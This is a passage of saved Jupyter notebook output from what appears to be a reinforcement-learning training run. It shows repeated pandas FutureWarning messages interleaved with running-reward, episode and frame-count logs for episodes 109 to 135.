      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2703.38\t Episode 109\t Frame count: 282938\t Context: 2\n",
      "Running reward: -2703.38\t Episode 109\t Frame count: 283976\t Context: 2\n",
      "Running reward: -2780.33\t Episode 110\t Frame count: 285507\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2780.33\t Episode 110\t Frame count: 289940\t Context: 2\n",
      "Running reward: -2832.93\t Episode 111\t Frame count: 290014\t Context: 2\n",
      "Running reward: -2832.93\t Episode 111\t Frame count: 291274\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2843.01\t Episode 112\t Frame count: 292556\t Context: 2\n",
      "Running reward: -2843.01\t Episode 112\t Frame count: 293320\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2862.69\t Episode 113\t Frame count: 295850\t Context: 2\n",
      "Running reward: -2862.69\t Episode 113\t Frame count: 297076\t Context: 2\n",
      "Running reward: -2887.95\t Episode 114\t Frame count: 298245\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2887.95\t Episode 114\t Frame count: 300652\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2918.46\t Episode 115\t Frame count: 302279\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2918.46\t Episode 115\t Frame count: 309062\t Context: 2\n",
      "Running reward: -2997.77\t Episode 116\t Frame count: 309242\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2997.77\t Episode 116\t Frame count: 314138\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -3046.53\t Episode 117\t Frame count: 315325\t Context: 2\n",
      "Running reward: -3046.53\t Episode 117\t Frame count: 317341\t Context: 2\n",
      "Running reward: -3073.08\t Episode 118\t Frame count: 319183\t Context: 2\n",
      "Running reward: -3073.08\t Episode 118\t Frame count: 324655\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -3134.70\t Episode 119\t Frame count: 327721\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -3232.43\t Episode 120\t Frame count: 340152\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -3232.43\t Episode 120\t Frame count: 340436\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -3287.83\t Episode 121\t Frame count: 342061\t Context: 2\n",
      "Running reward: -3287.83\t Episode 121\t Frame count: 342511\t Context: 2\n",
      "Running reward: -3305.35\t Episode 122\t Frame count: 346768\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -3402.68\t Episode 123\t Frame count: 359309\t Context: 2\n",
      "Running reward: -3402.68\t Episode 123\t Frame count: 359551\t Context: 2\n",
      "Running reward: -3467.29\t Episode 124\t Frame count: 360652\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -3467.29\t Episode 124\t Frame count: 362539\t Context: 2\n",
      "Running reward: -3492.74\t Episode 125\t Frame count: 363470\t Context: 2\n",
      "Running reward: -3492.74\t Episode 125\t Frame count: 363862\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -3500.03\t Episode 126\t Frame count: 365652\t Context: 2\n",
      "Running reward: -3500.03\t Episode 126\t Frame count: 368142\t Context: 2\n",
      "Running reward: -3534.77\t Episode 127\t Frame count: 370318\t Context: 2\n",
      "Running reward: -3534.77\t Episode 127\t Frame count: 371771\t Context: 2\n",
      "Running reward: -3557.29\t Episode 128\t Frame count: 371924\t Context: 2\n",
      "Running reward: -3557.29\t Episode 128\t Frame count: 372323\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -3560.89\t Episode 129\t Frame count: 374340\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -3560.89\t Episode 129\t Frame count: 378087\t Context: 2\n",
      "Running reward: -3616.60\t Episode 130\t Frame count: 380172\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -3616.60\t Episode 130\t Frame count: 382685\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -3659.28\t Episode 131\t Frame count: 389817\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -3755.09\t Episode 132\t Frame count: 398810\t Context: 2\n",
      "Running reward: -3755.09\t Episode 132\t Frame count: 400461\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -3828.23\t Episode 133\t Frame count: 401958\t Context: 2\n",
      "Running reward: -3828.23\t Episode 133\t Frame count: 403151\t Context: 2\n",
      "Running reward: -3852.09\t Episode 134\t Frame count: 407410\t Context: 2\n",
      "Running reward: -3852.09\t Episode 134\t Frame count: 407683\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -3891.22\t Episode 135\t Frame count: 411590\t Context: 2\n",
      "Running reward: -3891.22\t Episode 135\t Frame count: 415107\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
